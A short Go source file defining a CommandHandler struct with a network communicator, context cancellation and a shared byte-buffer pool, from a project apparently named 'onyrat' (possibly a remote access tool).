package commands

import (
	"context"
	"sync"

	"github.com/Onyz107/onyrat/pkg/network"
)

// The stream for commands being handled by our program
const commandStream = "commandStream"

type CommandHandler struct {
	Communicator network.Communicator
	Ctx          context.Context
	cancel       context.CancelCauseFunc
	done         chan error
}

// Small shared buffer pool
var smallBufPool = sync.Pool{
	New: func() any {
		return make([]byte, 1024)
	},
}
